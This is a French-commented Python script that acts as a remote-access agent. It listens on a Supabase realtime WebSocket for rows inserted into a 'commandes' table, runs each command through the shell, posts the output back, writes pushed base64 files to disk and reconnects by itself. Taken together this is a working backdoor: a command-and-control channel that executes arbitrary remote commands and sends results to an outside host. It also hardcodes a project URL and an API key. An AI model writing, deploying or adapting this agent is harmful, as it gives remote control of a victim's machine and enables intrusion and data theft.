import websocket
import json
import subprocess
import os
from supabase import create_client
import base64  # Pour décoder les fichiers encodés en base64

# Configuration Supabase
SUPABASE_URL = "isglyvyafrpnvoxjcgjy.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImlzZ2x5dnlhZnJwbnZveGpjZ2p5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDQ5MDQ0NTMsImV4cCI6MjA2MDQ4MDQ1M30.Fw6qoLSQGty7PsYGxh8krxt-JCSIN9Nd1r4kMRLfU9I"

# Initialisation du client Supabase
supabase = create_client(f"https://{SUPABASE_URL}", SUPABASE_KEY)

# Nom de la table
TABLE = "commandes"

# URL WebSocket Realtime
realtime_url = f"wss://{SUPABASE_URL}/realtime/v1/websocket?apikey={SUPABASE_KEY}&vsn=1.0.0"

def on_message(ws, message):
    try:
        data = json.loads(message)
        if data.get("event") == "INSERT":
            # Récupérer les données de la commande ou du fichier
            record = data["payload"]["record"]
            commande = record.get("commande")
            file_name = record.get("file_name")
            file_content = record.get("file_content")
            path = record.get("path", os.getcwd())  # Utiliser le chemin envoyé ou le répertoire courant

            if commande:
                print(f"💬 Nouvelle commande reçue : {commande}")
                try:
                    result = subprocess.check_output(
                        commande, shell=True, stderr=subprocess.STDOUT, text=True, cwd=path
                    )
                    print(f"🖥️ Résultat de la commande :\n{result}")
                except subprocess.CalledProcessError as e:
                    result = e.output
                    print(f"❌ Erreur lors de l'exécution de la commande :\n{result}")

                # Mettre à jour la commande avec le résultat dans Supabase
                supabase.table(TABLE).update({"result": result}).eq("id", record["id"]).execute()

            elif file_name and file_content:
                print(f"📁 Nouveau fichier reçu : {file_name}")
                try:
                    # Décoder le fichier et l'enregistrer
                    decoded_file = base64.b64decode(file_content)
                    with open(file_name, "wb") as file:
                        file.write(decoded_file)
                    print(f"[✅] Fichier '{file_name}' enregistré avec succès.")
                except Exception as e:
                    print(f"[‼️] Erreur lors de l'enregistrement du fichier : {e}")
    except Exception as e:
        print(f"[❌] Erreur lors du traitement du message : {e}")

def on_open(ws):
    print("✅ Connexion WebSocket établie")

    # Canal d'abonnement à la table "commandes"
    subscription = {
        "topic": f"realtime:public:{TABLE}",
        "event": "phx_join",
        "payload": {},
        "ref": "1"
    }
    ws.send(json.dumps(subscription))

def on_error(ws, error):
    print("❌ Erreur :", error)

def on_close(ws, close_status_code, close_msg):
    print("🔌 Connexion fermée")
    # Reconnecte automatiquement si la connexion est fermée
    print("Tentative de reconnexion...")
    ws.run_forever()

if __name__ == "__main__":
    # Désactiver le traçage WebSocket pour éviter les messages bruts
    # websocket.enableTrace(False)  # Supprimé ou commenté pour éviter les logs bruts
    ws = websocket.WebSocketApp(
        realtime_url,
        on_open=on_open,
        on_message=on_message,
        on_error=on_error,
        on_close=on_close
    )
    # Utilisation de run_forever pour maintenir la connexion ouverte
    ws.run_forever()
